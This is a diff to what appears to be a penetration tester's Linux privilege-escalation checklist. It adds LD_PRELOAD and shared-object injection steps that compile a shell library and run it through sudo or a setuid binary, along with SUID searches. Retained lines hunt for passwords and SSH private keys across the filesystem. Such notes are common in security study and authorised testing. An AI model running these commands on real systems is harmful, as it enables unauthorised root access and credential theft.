@@ -22,6 +22,7 @@ functions:
         - [ ] ssh -V
         - [ ] /bin/lsblk
         - [ ] lsmod
+        - [ ] sudo -V
 
         User Enum:
         - [ ] whoami
@@ -45,11 +46,24 @@ functions:
         - [ ] grep --color=auto -rnw '/' -ie "PASSWORD=" 2>/dev/null
         - [ ] locate pass | more
         - [ ] find / -name id_rsa 2>/dev/null
-        - [ ] find / -type f -exec grep -rnw --color=auto -i -I "PASSWORD" {} 2> /dev/null \;
-        find . -type f -exec grep --color=auto -Hrnwie "PASSWORD" {} 2> /dev/null \;  #search specific folders
+        - [ ] find . -type f -exec grep --color=auto -Hrnwie "PASSWORD" {} 2> /dev/null \;  #search specific folders
 
-        
+        LD_PRELOAD:
+        - [ ] sudo -l  #--> is LD_PRELOAD in the sudo permissions?
+          https://github.com/unkn0wnsyst3m/scripts/blob/master/shell_ldpreload.c
+          gcc -fPIC -shared shell.c -o shell.so -nostartfiles
 
+          sudo LD_PRELOAD=/home/user/shell.so <SUDO BIN>
+
+        SUID:
+        - [ ] find / -perm -u=s -type f -ls 2>/dev/null
+
+        SHARED OBJECT INJECTION:
+        - [ ] strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+          https://github.com/unkn0wnsyst3m/scripts/blob/master/shell_ldpreload.c
+          gcc -fPIC -shared shell.c -o shell.so -nostartfiles
+
+          run setuid_bin
 
         File Permission Searching:
         - [ ] find / -type f -perm -2 2>/dev/null | grep -v "^/proc/"                     #world writable
@@ -57,10 +71,10 @@ functions:
         - [ ] ls -al $(find / -perm -1000 -type d 2>/dev/null)   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
         - [ ] ls -al $(find / -perm -g=s -type f 2>/dev/null)    # SGID (chmod 2000) - run as the group, not the user who started it.
         - [ ] ls -al $(find / -perm -u=s -type f 2>/dev/null)    # SUID (chmod 4000) - run as the owner, not the user who started it.
-        - [ ] for file in $(find / -perm -u=s -type f 2>/dev/null ); do ls -al $file; done;
+        - [ ] find / -perm -u=s -type f -ls 2>/dev/null
         - [ ] find / -xdev -user root -perm -o+w -type f 2>/dev/null
         - [ ] find / -xdev -group admin -perm -o+w -type f 2>/dev/null
-        - [ ] find / -perm -u=s -type f -exec "ls -al {}" \; 2>/dev/null
+        
         - [ ] ls -al /etc/iptables/* -R
         - [ ] ls -lah /etc/cron*        
 
